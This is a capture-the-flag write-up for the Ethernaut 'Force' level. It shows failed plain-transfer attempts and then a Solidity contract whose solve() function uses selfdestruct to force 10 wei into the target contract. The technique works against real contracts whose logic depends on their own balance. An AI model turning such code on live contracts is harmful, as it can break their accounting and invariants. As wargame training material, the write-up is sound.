[7 - Force](https://ethernaut.openzeppelin.com/level/0x46f79002907a025599f355A04A512A6Fd45E671B)

Solution: 
* one way to force ether into contract is through using another contract's self-distruct opcode, which sends all balance to another address
* another way might be using fallback/receive functions?
```
await contract.sendTransaction({value: 1}); // failed since contract doesn't have **payable receive** function
await contract.sendTransaction({data: "0xfe", value: 1}); // failed since contract doesn't have **payable fallback** function
```
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceSolution {
  address payable private constant forceContractAddress = payable(0x60f258910759746c32a8f04baD582ff736799319);

  receive() external payable {}

  function solve() external {
    selfdestruct(forceContractAddress);
  }
}
sent 10 wei to ForceSolution contract
called solve() on ForceSolution contract, which should send the 10 wei balance to the Force contract
```
